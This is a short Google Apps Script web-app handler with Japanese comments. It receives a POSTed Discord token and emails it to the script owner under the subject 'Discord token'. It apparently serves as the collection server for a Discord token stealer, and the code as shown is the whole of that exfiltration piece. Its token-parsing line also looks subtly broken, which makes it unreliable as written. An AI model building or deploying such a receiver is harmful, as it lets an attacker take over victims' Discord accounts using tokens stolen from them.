function doPost (e) {
    var token = e.postData.contents.token;
    var email = "your_email@gmail.com"; // 自分のGmailアドレス
    var subject = "ディスコードトークン";
    var body = "取得したディスコードトークン: " + token;

    GmailApp.sendEmail(email, subject, body);
}
